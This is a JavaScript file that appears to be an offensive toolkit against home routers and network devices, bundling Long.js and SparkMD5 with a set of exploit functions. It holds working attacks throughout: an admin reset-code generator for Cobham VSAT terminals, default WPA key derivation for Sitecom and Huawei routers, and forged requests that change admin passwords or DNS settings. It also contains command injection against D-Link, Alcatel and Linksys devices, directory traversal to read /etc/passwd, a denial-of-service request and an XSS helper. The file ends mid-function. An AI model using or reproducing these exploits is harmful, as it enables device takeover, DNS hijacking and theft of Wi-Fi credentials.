
/*
Long.js (c) 2013 Daniel Wirtz <dcode@dcode.io>
 Released under the Apache License, Version 2.0
 see: https://github.com/dcodeIO/Long.js for details

 Long.js is based on goog.math.Long from the Closure Library.
 Copyright 2009 The Closure Library Authors. All Rights Reserved.
 Released under the Apache License, Version 2.0
 see: https://code.google.com/p/closure-library/ for details

*/
var p=!1;
(function(r){function b(a,b,d){this.low=a|0;this.high=b|0;this.unsigned=!!d}var s={},t={};b.fromInt=function(a,c){var d;if(c){a>>>=0;if(0<=a&&256>a&&(d=t[a]))return d;d=new b(a,0>(a|0)?-1:0,!0);0<=a&&256>a&&(t[a]=d)}else{a|=0;if(-128<=a&&128>a&&(d=s[a]))return d;d=new b(a,0>a?-1:0,p);-128<=a&&128>a&&(s[a]=d)}return d};b.fromNumber=function(a,c){c=!!c;return isNaN(a)||!isFinite(a)?b.ZERO:!c&&a<=-u?b.MIN_SIGNED_VALUE:c&&0>=a?b.MIN_UNSIGNED_VALUE:!c&&a+1>=u?b.MAX_SIGNED_VALUE:c&&a>=v?b.MAX_UNSIGNED_VALUE:0>
a?b.fromNumber(-a,p).negate():new b(a%l|0,a/l|0,c)};b.fromBits=function(a,c,d){return new b(a,c,d)};b.from28Bits=function(a,c,d,e){return b.fromBits(a|c<<28,c>>>4|d<<24,e)};b.fromString=function(a,c,d){if(0==a.length)throw Error("number format error: empty string");if("NaN"===a||"Infinity"===a||"+Infinity"===a||"-Infinity"===a)return b.ZERO;"number"===typeof c&&(d=c,c=p);d=d||10;if(2>d||36<d)throw Error("radix out of range: "+d);if("-"==a.charAt(0))return b.fromString(a.substring(1),c,d).negate();
if(0<=a.indexOf("-"))throw Error('number format error: interior "-" character: '+a);c=b.fromNumber(Math.pow(d,8));for(var e=b.ZERO,g=0;g<a.length;g+=8){var f=Math.min(8,a.length-g),k=parseInt(a.substring(g,g+f),d);8>f?(f=b.fromNumber(Math.pow(d,f)),e=e.multiply(f).add(b.fromNumber(k))):(e=e.multiply(c),e=e.add(b.fromNumber(k)))}return e};var l=4294967296,v=l*l,u=v/2,w=b.fromInt(16777216);b.ZERO=b.fromInt(0);b.ONE=b.fromInt(1);b.NEG_ONE=b.fromInt(-1);b.MAX_SIGNED_VALUE=b.fromBits(-1,2147483647,p);
b.MAX_UNSIGNED_VALUE=b.fromBits(-1,-1,!0);b.MAX_VALUE=b.MAX_SIGNED_VALUE;b.MIN_SIGNED_VALUE=b.fromBits(0,-2147483648,p);b.MIN_UNSIGNED_VALUE=b.fromBits(0,0,!0);b.MIN_VALUE=b.MIN_SIGNED_VALUE;b.prototype.toInt=function(){return this.unsigned?this.low>>>0:this.low};b.prototype.toNumber=function(){return this.unsigned?(this.high>>>0)*l+(this.low>>>0):this.high*l+(this.low>>>0)};b.prototype.toString=function(a){a=a||10;if(2>a||36<a)throw Error("radix out of range: "+a);if(this.isZero())return"0";var c;
if(this.isNegative()){if(this.equals(b.MIN_SIGNED_VALUE)){c=b.fromNumber(a);var d=this.div(c);c=d.multiply(c).subtract(this);return d.toString(a)+c.toInt().toString(a)}return"-"+this.negate().toString(a)}d=b.fromNumber(Math.pow(a,6));c=this;for(var e="";;){var g=c.div(d),f=c.subtract(g.multiply(d)).toInt().toString(a);c=g;if(c.isZero())return f+e;for(;6>f.length;)f="0"+f;e=""+f+e}};b.prototype.getHighBits=function(){return this.high};b.prototype.getHighBitsUnsigned=function(){return this.high>>>0};
b.prototype.getLowBits=function(){return this.low};b.prototype.getLowBitsUnsigned=function(){return this.low>>>0};b.prototype.getNumBitsAbs=function(){if(this.isNegative())return this.equals(b.MIN_SIGNED_VALUE)?64:this.negate().getNumBitsAbs();for(var a=0!=this.high?this.high:this.low,c=31;0<c&&0==(a&1<<c);c--);return 0!=this.high?c+33:c+1};b.prototype.isZero=function(){return 0==this.high&&0==this.low};b.prototype.isNegative=function(){return!this.unsigned&&0>this.high};b.prototype.isOdd=function(){return 1==
(this.low&1)};b.prototype.equals=function(a){return this.unsigned!=a.unsigned&&this.high>>>31!=a.high>>>31?p:this.high==a.high&&this.low==a.low};b.prototype.notEquals=function(a){return!this.equals(a)};b.prototype.lessThan=function(a){return 0>this.compare(a)};b.prototype.lessThanOrEqual=function(a){return 0>=this.compare(a)};b.prototype.greaterThan=function(a){return 0<this.compare(a)};b.prototype.greaterThanOrEqual=function(a){return 0<=this.compare(a)};b.prototype.compare=function(a){if(this.equals(a))return 0;
var b=this.isNegative(),d=a.isNegative();return b&&!d?-1:!b&&d?1:this.unsigned?a.high>>>0>this.high>>>0||a.high==this.high&&a.low>>>0>this.low>>>0?-1:1:this.subtract(a).isNegative()?-1:1};b.prototype.negate=function(){return!this.unsigned&&this.equals(b.MIN_SIGNED_VALUE)?b.MIN_SIGNED_VALUE:this.not().add(b.ONE)};b.prototype.add=function(a){var c=this.high>>>16,d=this.high&65535,e=this.low>>>16,g=a.high>>>16,f=a.high&65535,k=a.low>>>16,q;q=0+((this.low&65535)+(a.low&65535));a=0+(q>>>16);a+=e+k;e=0+
(a>>>16);e+=d+f;d=0+(e>>>16);d=d+(c+g)&65535;return b.fromBits((a&65535)<<16|q&65535,d<<16|e&65535,this.unsigned)};b.prototype.subtract=function(a){return this.add(a.negate())};b.prototype.multiply=function(a){if(this.isZero()||a.isZero())return b.ZERO;if(this.equals(b.MIN_VALUE))return a.isOdd()?b.MIN_VALUE:b.ZERO;if(a.equals(b.MIN_VALUE))return this.isOdd()?b.MIN_VALUE:b.ZERO;if(this.isNegative())return a.isNegative()?this.negate().multiply(a.negate()):this.negate().multiply(a).negate();if(a.isNegative())return this.multiply(a.negate()).negate();
if(this.lessThan(w)&&a.lessThan(w))return b.fromNumber(this.toNumber()*a.toNumber(),this.unsigned);var c=this.high>>>16,d=this.high&65535,e=this.low>>>16,g=this.low&65535,f=a.high>>>16,k=a.high&65535,q=a.low>>>16;a=a.low&65535;var n,h,m,l;l=0+g*a;m=0+(l>>>16);m+=e*a;h=0+(m>>>16);m=(m&65535)+g*q;h+=m>>>16;m&=65535;h+=d*a;n=0+(h>>>16);h=(h&65535)+e*q;n+=h>>>16;h&=65535;h+=g*k;n+=h>>>16;h&=65535;n=n+(c*a+d*q+e*k+g*f)&65535;return b.fromBits(m<<16|l&65535,n<<16|h,this.unsigned)};b.prototype.div=function(a){if(a.isZero())throw Error("division by zero");
if(this.isZero())return b.ZERO;if(this.equals(b.MIN_SIGNED_VALUE)){if(a.equals(b.ONE)||a.equals(b.NEG_ONE))return min;if(a.equals(b.MIN_VALUE))return b.ONE;var c=this.shiftRight(1).div(a).shiftLeft(1);if(c.equals(b.ZERO))return a.isNegative()?b.ONE:b.NEG_ONE;var d=this.subtract(a.multiply(c));return c.add(d.div(a))}if(a.equals(b.MIN_VALUE))return b.ZERO;if(this.isNegative())return a.isNegative()?this.negate().div(a.negate()):this.negate().div(a).negate();if(a.isNegative())return this.div(a.negate()).negate();
for(var e=b.ZERO,d=this;d.greaterThanOrEqual(a);){for(var c=Math.max(1,Math.floor(d.toNumber()/a.toNumber())),g=Math.ceil(Math.log(c)/Math.LN2),g=48>=g?1:Math.pow(2,g-48),f=b.fromNumber(c,this.unsigned),k=f.multiply(a);k.isNegative()||k.greaterThan(d);)c-=g,f=b.fromNumber(c,this.unsigned),k=f.multiply(a);f.isZero()&&(f=b.ONE);e=e.add(f);d=d.subtract(k)}return e};b.prototype.modulo=function(a){return this.subtract(this.div(a).multiply(a))};b.prototype.not=function(){return b.fromBits(~this.low,~this.high,
this.unsigned)};b.prototype.and=function(a){return b.fromBits(this.low&a.low,this.high&a.high,this.unsigned)};b.prototype.or=function(a){return b.fromBits(this.low|a.low,this.high|a.high,this.unsigned)};b.prototype.xor=function(a){return b.fromBits(this.low^a.low,this.high^a.high,this.unsigned)};b.prototype.shiftLeft=function(a){a&=63;if(0==a)return this;var c=this.low;return 32>a?b.fromBits(c<<a,this.high<<a|c>>>32-a,this.unsigned):b.fromBits(0,c<<a-32,this.unsigned)};b.prototype.shiftRight=function(a){a&=
63;if(0==a)return this;var c=this.high;return 32>a?b.fromBits(this.low>>>a|c<<32-a,c>>a,this.unsigned):b.fromBits(c>>a-32,0<=c?0:-1,this.unsigned)};b.prototype.shiftRightUnsigned=function(a){a&=63;if(0==a)return this;var c=this.high;return 32>a?b.fromBits(this.low>>>a|c<<32-a,c>>>a,this.unsigned):32==a?b.fromBits(c,0,this.unsigned):b.fromBits(c>>>a-32,0,this.unsigned)};b.prototype.toSigned=function(){var a=this.clone();a.unsigned=p;return a};b.prototype.toUnsigned=function(){var a=this.clone();a.unsigned=
!0;return a};b.prototype.clone=function(){return new b(this.low,this.high,this.unsigned)};"undefined"!=typeof module&&module.exports?module.exports=b:"undefined"!=typeof define&&define.amd?define("Math/Long",[],function(){return b}):(r.dcodeIO||(r.dcodeIO={}),r.dcodeIO.Long=b)})(this);

/* SparkMD5 */
(function(a){if(typeof exports==="object"){module.exports=a()}else{if(typeof define==="function"&&define.amd){define(a)}else{var c;try{c=window}catch(b){c=self}c.SparkMD5=a()}}}(function(c){var e=function(s,r){return(s+r)&4294967295},n=function(z,v,u,r,y,w){v=e(e(v,z),e(r,w));return e((v<<y)|(v>>>(32-y)),u)},a=function(v,u,A,z,r,y,w){return n((u&A)|((~u)&z),v,u,r,y,w)},k=function(v,u,A,z,r,y,w){return n((u&z)|(A&(~z)),v,u,r,y,w)},f=function(v,u,A,z,r,y,w){return n(u^A^z,v,u,r,y,w)},p=function(v,u,A,z,r,y,w){return n(A^(u|(~z)),v,u,r,y,w)},d=function(s,u){var t=s[0],r=s[1],w=s[2],v=s[3];t=a(t,r,w,v,u[0],7,-680876936);v=a(v,t,r,w,u[1],12,-389564586);w=a(w,v,t,r,u[2],17,606105819);r=a(r,w,v,t,u[3],22,-1044525330);t=a(t,r,w,v,u[4],7,-176418897);v=a(v,t,r,w,u[5],12,1200080426);w=a(w,v,t,r,u[6],17,-1473231341);r=a(r,w,v,t,u[7],22,-45705983);t=a(t,r,w,v,u[8],7,1770035416);v=a(v,t,r,w,u[9],12,-1958414417);w=a(w,v,t,r,u[10],17,-42063);r=a(r,w,v,t,u[11],22,-1990404162);t=a(t,r,w,v,u[12],7,1804603682);v=a(v,t,r,w,u[13],12,-40341101);w=a(w,v,t,r,u[14],17,-1502002290);r=a(r,w,v,t,u[15],22,1236535329);t=k(t,r,w,v,u[1],5,-165796510);v=k(v,t,r,w,u[6],9,-1069501632);w=k(w,v,t,r,u[11],14,643717713);r=k(r,w,v,t,u[0],20,-373897302);t=k(t,r,w,v,u[5],5,-701558691);v=k(v,t,r,w,u[10],9,38016083);w=k(w,v,t,r,u[15],14,-660478335);r=k(r,w,v,t,u[4],20,-405537848);t=k(t,r,w,v,u[9],5,568446438);v=k(v,t,r,w,u[14],9,-1019803690);w=k(w,v,t,r,u[3],14,-187363961);r=k(r,w,v,t,u[8],20,1163531501);t=k(t,r,w,v,u[13],5,-1444681467);v=k(v,t,r,w,u[2],9,-51403784);w=k(w,v,t,r,u[7],14,1735328473);r=k(r,w,v,t,u[12],20,-1926607734);t=f(t,r,w,v,u[5],4,-378558);v=f(v,t,r,w,u[8],11,-2022574463);w=f(w,v,t,r,u[11],16,1839030562);r=f(r,w,v,t,u[14],23,-35309556);t=f(t,r,w,v,u[1],4,-1530992060);v=f(v,t,r,w,u[4],11,1272893353);w=f(w,v,t,r,u[7],16,-155497632);r=f(r,w,v,t,u[10],23,-1094730640);t=f(t,r,w,v,u[13],4,681279174);v=f(v,t,r,w,u[0],11,-358537222);w=f(w,v,t,r,u[3],16,-722521979);r=f(r,w,v,t,u[6],23,76029189);t=f(t,r,w,v,u[9],4,-640364487);v=f(v,t,r,w,u[12],11,-421815835);w=f(w,v,t,r,u[15],16,530742520);r=f(r,w,v,t,u[2],23,-995338651);t=p(t,r,w,v,u[0],6,-198630844);v=p(v,t,r,w,u[7],10,1126891415);w=p(w,v,t,r,u[14],15,-1416354905);r=p(r,w,v,t,u[5],21,-57434055);t=p(t,r,w,v,u[12],6,1700485571);v=p(v,t,r,w,u[3],10,-1894986606);w=p(w,v,t,r,u[10],15,-1051523);r=p(r,w,v,t,u[1],21,-2054922799);t=p(t,r,w,v,u[8],6,1873313359);v=p(v,t,r,w,u[15],10,-30611744);w=p(w,v,t,r,u[6],15,-1560198380);r=p(r,w,v,t,u[13],21,1309151649);t=p(t,r,w,v,u[4],6,-145523070);v=p(v,t,r,w,u[11],10,-1120210379);w=p(w,v,t,r,u[2],15,718787259);r=p(r,w,v,t,u[9],21,-343485551);s[0]=e(t,s[0]);s[1]=e(r,s[1]);s[2]=e(w,s[2]);s[3]=e(v,s[3])},q=function(t){var u=[],r;for(r=0;r<64;r+=4){u[r>>2]=t.charCodeAt(r)+(t.charCodeAt(r+1)<<8)+(t.charCodeAt(r+2)<<16)+(t.charCodeAt(r+3)<<24)}return u},m=function(r){var t=[],s;for(s=0;s<64;s+=4){t[s>>2]=r[s]+(r[s+1]<<8)+(r[s+2]<<16)+(r[s+3]<<24)}return t},l=function(A){var u=A.length,r=[1732584193,-271733879,-1732584194,271733878],w,t,z,x,y,v;for(w=64;w<=u;w+=64){d(r,q(A.substring(w-64,w)))}A=A.substring(w-64);t=A.length;z=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(w=0;w<t;w+=1){z[w>>2]|=A.charCodeAt(w)<<((w%4)<<3)}z[w>>2]|=128<<((w%4)<<3);if(w>55){d(r,z);for(w=0;w<16;w+=1){z[w]=0}}x=u*8;x=x.toString(16).match(/(.*?)(.{0,8})$/);y=parseInt(x[2],16);v=parseInt(x[1],16)||0;z[14]=y;z[15]=v;d(r,z);return r},o=function(z){var t=z.length,r=[1732584193,-271733879,-1732584194,271733878],v,s,y,w,x,u;for(v=64;v<=t;v+=64){d(r,m(z.subarray(v-64,v)))}z=(v-64)<t?z.subarray(v-64):new Uint8Array(0);s=z.length;y=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(v=0;v<s;v+=1){y[v>>2]|=z[v]<<((v%4)<<3)}y[v>>2]|=128<<((v%4)<<3);if(v>55){d(r,y);for(v=0;v<16;v+=1){y[v]=0}}w=t*8;w=w.toString(16).match(/(.*?)(.{0,8})$/);x=parseInt(w[2],16);u=parseInt(w[1],16)||0;y[14]=x;y[15]=u;d(r,y);return r},j=["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"],h=function(u){var t="",r;for(r=0;r<4;r+=1){t+=j[(u>>(r*8+4))&15]+j[(u>>(r*8))&15]}return t},b=function(r){var s;for(s=0;s<r.length;s+=1){r[s]=h(r[s])}return r.join("")},i=function(r){return b(l(r))},g=function(){this.reset()};if(i("hello")!=="5d41402abc4b2a76b9719d911017c592"){e=function(r,u){var t=(r&65535)+(u&65535),s=(r>>16)+(u>>16)+(t>>16);return(s<<16)|(t&65535)}}g.prototype.append=function(r){if(/[\u0080-\uFFFF]/.test(r)){r=unescape(encodeURIComponent(r))}this.appendBinary(r);return this};g.prototype.appendBinary=function(t){this._buff+=t;this._length+=t.length;var s=this._buff.length,r;for(r=64;r<=s;r+=64){d(this._state,q(this._buff.substring(r-64,r)))}this._buff=this._buff.substr(r-64);return this};g.prototype.end=function(t){var w=this._buff,v=w.length,u,s=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],r;for(u=0;u<v;u+=1){s[u>>2]|=w.charCodeAt(u)<<((u%4)<<3)}this._finish(s,v);r=!!t?this._state:b(this._state);this.reset();return r};g.prototype._finish=function(s,w){var u=w,t,v,r;s[u>>2]|=128<<((u%4)<<3);if(u>55){d(this._state,s);for(u=0;u<16;u+=1){s[u]=0}}t=this._length*8;t=t.toString(16).match(/(.*?)(.{0,8})$/);v=parseInt(t[2],16);r=parseInt(t[1],16)||0;s[14]=v;s[15]=r;d(this._state,s)};g.prototype.reset=function(){this._buff="";this._length=0;this._state=[1732584193,-271733879,-1732584194,271733878];return this};g.prototype.destroy=function(){delete this._state;delete this._buff;delete this._length};g.hash=function(t,r){if(/[\u0080-\uFFFF]/.test(t)){t=unescape(encodeURIComponent(t))}var s=l(t);return !!r?s:b(s)};g.hashBinary=function(s,r){var t=l(s);return !!r?t:b(t)};g.ArrayBuffer=function(){this.reset()};g.ArrayBuffer.prototype.append=function(r){var u=this._concatArrayBuffer(this._buff,r),t=u.length,s;this._length+=r.byteLength;for(s=64;s<=t;s+=64){d(this._state,m(u.subarray(s-64,s)))}this._buff=(s-64)<t?u.subarray(s-64):new Uint8Array(0);return this};g.ArrayBuffer.prototype.end=function(t){var w=this._buff,v=w.length,s=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],u,r;for(u=0;u<v;u+=1){s[u>>2]|=w[u]<<((u%4)<<3)}this._finish(s,v);r=!!t?this._state:b(this._state);this.reset();return r};g.ArrayBuffer.prototype._finish=g.prototype._finish;g.ArrayBuffer.prototype.reset=function(){this._buff=new Uint8Array(0);this._length=0;this._state=[1732584193,-271733879,-1732584194,271733878];return this};g.ArrayBuffer.prototype.destroy=g.prototype.destroy;g.ArrayBuffer.prototype._concatArrayBuffer=function(u,s){var t=u.length,r=new Uint8Array(t+s.byteLength);r.set(u);r.set(new Uint8Array(s),t);return r};g.ArrayBuffer.hash=function(r,s){var t=o(new Uint8Array(r));return !!s?t:b(t)};return g}));


        // Cobham Aviator/Explorer/Sailor - Predictable Admin Reset Code -CVE-2014-2943 
        // First Javascript Exploit for VSAT Terminals. 
        // Ruben Santamarta from IOActive released the vulnerability at Blackhat 2014 but the hardcoded string was "redacted". :-) 
        // Sinnet3000 found the complete hardcoded string and wrote the JS exploit.
        // Requires SparkMD5

        function cobhamaviatorsailorexplorer_serialreset()
        {
        var cobham_md5 = new SparkMD5();
        var serial_number = prompt("Serial number (Ex: 12345678");
        var serial_hex = serial_number.match(/.{1,2}/g).map(function(item) { return String.fromCharCode(parseInt(item, 16))}).join("");
        var padding = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        var magic_string = "kdf04rasdfKKduzA";
        var to_hash = serial_hex + padding + magic_string;
        window.alert("Your unlock code is: " + SparkMD5.hashBinary(to_hash));
        }

/*
 Default WPA key generator for Sitecom WLR-4000/4004 routers
 ===========================================================
 Javascript version ported by: 
   Luis Colunga        (@sinnet3000)
 Original Authors: 
   Roberto Paleari     (@rpaleari)
   Alessandro Di Pinto (@adipinto)

 Advisory URL:
   http://blog.emaze.net/2014/04/sitecom-firmware-and-wifi.html

   Javascript port depends on Long.js

 */

 // Binatone DT 850W Wireless Router - Change Admin Password
function binatone_dt850w_changeadmin(ip)
{
    ip = ip || "192.168.1.1";
    pwd = prompt("New Admin Password: ");
    form = '<input type="hidden" name="uiViewTools_Password" value="' + pwd + '">\
            <input type="hidden" name="uiViewTools_PasswordConfirm" value="' + pwd + '">';
			
	post('http://' + ip + '/Forms/tools_admin_1', form);

}


function sitecom400xwpa(keylength) {
    "use strict";

    // Charsets used for the generation of WPA key by different Sitecom models
	var CHARSETS = {
    4000: [ "23456789ABCDEFGHJKLMNPQRSTUVWXYZ38BZ", "WXCDYNJU8VZABKL46PQ7RS9T2E5H3MFGPWR2" ],
    4004: [ "JKLMNPQRST23456789ABCDEFGHUVWXYZ38BK", "E5MFJUWXCDKL46PQHAB3YNJ8VZ7RS9TR2GPW" ]
	};


    var  model = prompt("Model (4004, or 4000): ");
    var mac = prompt("Mac Address (XX:XX:XX:XX:XX:XX): ");
    keylength = keylength || 12;
    var charset1 = CHARSETS[model][0];
    var charset2 = CHARSETS[model][1];
    var mac_withoutcolons = mac.replace(/:/gi, '');
    var mac_substring = mac_withoutcolons.substring(4, 12);
    
    // Bitwise and Arithmetical Operations with numbers > 31 bits are problematic in JS, using Long.js as a workaround.
    var Long = dcodeIO.Long;
    var magic1 = new Long(Long.fromNumber(0x98124557));
    var magic2 = new Long(Long.fromNumber(0x0004321A));
    var magic3 = new Long(Long.fromNumber(0x80000000));
    var val = new Long(Long.fromString(mac_substring, 16));
    
    var offsets = [];

    var offset;

    for (var i = 0; i < keylength; i++) {
       if ( val.and(Long.fromNumber(1)).toNumber() === 0 ) {
            val = val.xor(magic2);
	    val = val.shiftRight(1); }
       else {
            val = val.xor(magic1);
            val = val.shiftRight(1);
            val = val.or(magic3); }

        offset = val.modulo(Long.fromNumber(charset1.length));
        
        offsets.push(offset.toNumber()); 
	}

    
    var wpa_key = "";
    wpa_key += charset1[offsets[0]];

    var magic3f, magic1f;

    for (var j = 0; j < keylength-1; j++) {
	    magic3f = offsets[i];
        magic1f = offsets[j+1];

        if (magic3f !== magic1f) {
            magic3f = charset1[magic1f];
        }
        else {
            magic3f = (magic3f + j) % charset1.length;
            magic3f = charset2[magic3f]; }
        wpa_key += magic3f;
	}

    alert("WPA Key is: " + wpa_key);
     
}


function img(query) {
	document.location="http://www.google.com/search?tbm=isch&q="+query;
}

function setip(url) {
	ip=prompt("IP:");
	if (ip==null || ip==""){}else{document.location="http://"+ip+url;}
}

function setipssl(url) {
	ip=prompt("IP:");
	if (ip==null || ip==""){}else{document.location="https://"+ip+url;}
}

function getxss() {
	r=confirm("Use %3Cscript%3Ealert%281%29%3C%2fscript%3E ?");
	if (r==true){
	  xss="%3Cscript%3Ealert%281%29%3C%2fscript%3E"
	  }
	else {
	  xss=prompt("Enter custom XSS injection:");
		}
	return xss;
}

// Unicorn Router WB-3300NR - Factory Reset
function wb3300nr_factoryreset(ip)
{
    ip = ip || "192.168.123.254";
    var form = '<input type="hidden" name="CMD" value="SYS_CONF"/>\
	    <input type="hidden" name="GO" value="system_reboot.asp"/>\
            <input type="hidden" name="CCMD" value="0"/>';
	    
          post('http://' + ip + '/goform/SysToolRestoreSet', form);

}

// Unicorn Router WB-3300NR - Change DNS
function wb3300nr_changedns(ip)
{
    ip = ip || "192.168.123.254";
    dns1 = prompt("DNS 1 (Ex. 8.8.8.8): ");
    dns2 = prompt("DNS 2 (Ex. 8.8.4.4): ")

    var form = '<input type="hidden" name="GO" value="wan_dns.asp"/>\
			<input type="hidden" name="rebootTag" value=""/>\
			<input type="hidden" name="DSEN" value="1"/>\
			<input type="hidden" name="DNSEN" value="o"/>\
			<input type="hidden" name="DS1" value="' + dns1 + '"/>\
			<input type="hidden" name="DS2" value="' + dns1 + '"/>';
	post('http://' + ip + '/goform/AdvSetDns', form);

}

// Alcatel-Lucent OmniPCX Enterprise - masterCGI Arbitrary Command Execution
function omnipcx_mastercgicommandexec(ip)
{
	cmd = prompt("Command:");
	url = "/cgi-bin/masterCGI?ping=nomip&user=;" + encodeURI(cmd) + ";";
	document.location="http://"+ip+url;
}

function dwr113_dos(ip)
{
	    ip = ip || "192.168.0.1";
	    var form = '<input type="hidden" name="S00010002" value="test" />\
	    <input type="hidden" name="np2" value="test" />\
        <input type="hidden" name="N00150004" value="0" />\
        <input type="hidden" name="N00150001" value="" />\
        <input type="hidden" name="N00150003" value="1080" />\
        <input type="hidden" name="_cce" value="0x80150002" />\
        <input type="hidden" name="_sce" value="%Ssc" />\
        <input type="submit" value="Submit request" />';
	post('http://' + ip + '/rebo.htm', form);
}

// D-Link DIR-300, DIR-615 - Remote Command Execution
function dir300615_commandexec(ip)
{
	ip = ip || "192.168.178.155";
	cmd = prompt("Command:");
	url = "/tools_system.xgi?random_num=2012.8.24.13.34.33&exeshell=submit%20`" + encodeURI(cmd) + "`";
	document.location="http://"+ip+url;
}

// Starbridge Lynx 526 - Password Reset
function lynx526_passwordreset(ip)
{
	ip = ip || "192.168.1.1";
	password = prompt("New Password:");
	url = "/password.cgi?sysPassword=" + password;
	document.location="http://"+ip+url;
}

function urlxss(url) {
	url = url.replace("URLXSS", getxss());
	document.location=url;
}

    function HG824x()
{
    //HUAWEI HG8245/HG8247 MAC Address to WPA Key
    MACs = prompt("MAC:");

    var MAC = [];

    if (MACs.length == 17)
    {
	MAC = MACs.split(":");
    }

    else
    {
		for (var i = 0, charsLength = MACs.length; i < charsLength; i += 2) {
    	MAC.push(MACs.substring(i, i + 2));
		}
    }
	
	last=MAC[0];
	part1=MAC[3];
	part2=MAC[4];
	partx=MAC[5];
	extract=MAC[5].split("");
	part3=extract[0];
	offset=extract[1];
	integer=parseInt(offset,16);
	value=parseInt(part3,16);
	

	if ( integer >= 0 && integer <= 8 ){
		if ( value == 0 ){
			val = "F"; 
		}else{
			value = value - 1; 
		}
	} 
	val = value.toString(16).toUpperCase();
	switch (offset) { 
		case "8": part3="F"; break; case "9": part3="0"; break; case "A": part3="1"; break; case "B": part3="2"; break;
		case "C": part3="3"; break; case "D": part3="4"; break;	case "E": part3="5"; break; case "F": part3="6"; break;
		case "0": part3="7"; break; case "1": part3="8"; break; case "2": part3="9"; break; case "3": part3="A"; break;
		case "4": part3="B"; break;	case "5": part3="C"; break;	case "6": part3="D"; break;	case "7": part3="E"; break;	}
	switch (last) {
		case "28": part4="03"; break; case "08": part4="05"; break;	case "80": part4="06"; break; case "E0": part4="0C"; break;
		case "00": part4="0D"; break; case "10": part4="0E"; break;	case "CC": part4="12"; break; case "D4": part4="35"; break;
		case "AC": part4="1A"; break; case "20": part4="1F"; break; case "70": part4="20"; break; case "F8": part4="21"; break;	
		case "48": part4="24"; break; default: alert("This MAC might is not elegible for getting WPA key"); return;}
	integer=parseInt(partx,16);	
	if ( integer >= 0 && integer <= 8 ){
		new_v=parseInt(part2,16);
		new_value=new_v-1;
		part2=new_value.toString(16).toUpperCase()
		if ( val == 0 ){
			val = "F"; 
		}
	}
	alert("WPA Key: "+part1+part2+val+part3+part4);
}

function hg866pass() {
	admin=prompt("Change administrator password:");
	document.hg866pass.psw.value=admin;
	document.hg866pass.reenterpsw.value=admin;
	document.hg866pass.action="http://192.168.100.251/html/password.html";
	if (admin==null || admin==""){}else{
		document.hg866pass.submit();
	}
}
function hg866passr() {
	ip=prompt("IP:");
	admin=prompt("Change administrator password:");
	document.hg866pass.psw.value=admin;
	document.hg866pass.reenterpsw.value=admin;
	document.hg866pass.action="http://"+ip+"/html/password.html";
	document.hg866pass.submit();
}
// D-Link DAP-1320 Wireless Range Extender - Directory Traversal.html
	function dap1320_dirtraversal(ip)
	{

		ip = ip || "dlinkap.local";
		path = prompt("Path: (ex: /etc/passwd)");
		

		var form = '<input type="hidden"	name="submit_type" value="nas_admin"/>\
		<input	type="hidden"	name="next_page"	value="%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F' + encodeURI(path) + '"/>\
		<input	type="hidden"	name="login_name"	value=""/>\
		<input	type="hidden"	name="html_response_message" value="just_login"/>\
		<input	type="hidden"	name="log_pass"	value=""/>\
		<input	type="hidden"	name="login_n"	value="admin"/>\
		<input	type="hidden"	name="action"	value="do_graph_auth"/>\
		<input	type="hidden"	name="tmp_log_pass"	value="PAN"/>\
		<input	type="hidden"	name="tmp_log_pass_auth"	value="FRIED"/>\
		<input	type="hidden"	name="graph_code"	value="0DEY"/>\
		<input	type="hidden"	name="session_id"	value="57687"/>\
		<input	type="hidden"	name="gcode_base64"	value="8TEHPOO%3D"/>\</form>';
		
		post('http://' + ip + '/apply.cgi', form);
		
	}
	function hg866dosr() {
		ip=prompt("IP:");
		document.hg866dos.action="http://"+ip+"/html/admin_reboot.html";
		if (ip==null || ip==""){}else{
			document.hg866dos.submit();
		}
	}

function rtn16_passdisclosure(ip)
{
    ip = ip || "192.168.1.1";
    document.location="http://"+ip+"/error_page.htm";
}

// Cisco Linksys WAG200GB - Remote Command Execution
function wag200gb_command(ip)
{
	ip = ip || "192.168.1.1";
	cmd = prompt("Command:");

	var form = '<input	type="hidden"	name="wan_encapmode"	value="pppoa"/>\
			    <input	type="hidden"	name="wan_multiplex"	value="11c"/>\
			    <input	type="hidden"	name="pppoa_multiplex"	value="vc/>\
			    <input	type="hidden"	name="wan_qostype"	value="ubr"/>\
			    <input	type="hidden"	name="dsl_modulation"	value="MMODE"/>\
			    <input	type="hidden"	name="bridged_dhcpenable"	value="dhcp"/>\
			    <input	type="hidden"	name="ipppoe_enable"	value="0"/>\
			    <input	type="hidden"	name="PoeUserName"	value="admin"/>\
			    <input	type="hidden"	name="PoePasswd"	value="admin"/>\
			    <input	type="hidden"	name="pppoeDODC"	value="pppoeDODC"/>\
			    <input	type="hidden"	name="poeIdleTime"	value="5"/>\
			    <input	type="hidden"	name="hostname"	value="test"/>\
			    <input	type="hidden"	name="domainname"	value=""/>\
			    <input	type="hidden"	name="mtu_type"	value="auto"/>\
			    <input	type="hidden"	name="lan_ip_1"	value="192"/>\
			    <input	type="hidden"	name="lan_ip_2"	value="168"/>\
			    <input	type="hidden"	name="lan_ip_3"	value="178"/>\
			    <input	type="hidden"	name="lan_ip_4"	value="199"/>\
			    <input	type="hidden"	name="lan_mask"	value="0"/>\
			    <input	type="hidden"	name="lan_dhcp"	value="disable"/>\
			    <input	type="hidden"	name="time_zone"	value="%2B0+2"/>\
			    <input	type="hidden"	name="timer_interval"	value="%60' + encodeURI(cmd) + '%60"/>\
			    <input	type="hidden"	name="upgrade_langpkt"	value="1"/>\
			    <input	type="hidden"	name="save"	value="Save+Settings"/>\
			    <input	type="hidden"	name="c4_wan_ip_"	value=""/>\
			    <input	type="hidden"	name="c4_wan_gw_"	value=""/>\
			    <input	type="hidden"	name="c4_wan_dns1_"	value=""/>\
			    <input	type="hidden"	name="c4_wan_dns2_"	value="pppoa"/>\
			    <input	type="hidden"	name="c4_lan_ip_"	value="192.168.178.199"/>\
			    <input	type="hidden"	name="c4_dhcpserver_ip_"	value=""/>\
			    <input	type="hidden"	name="c4_static_dns0_"	value=""/>\
			    <input	type="hidden"	name="c4_static_dns1_"	value=""/>\
			    <input	type="hidden"	name="c4_static_dns2_"	value=""/>\
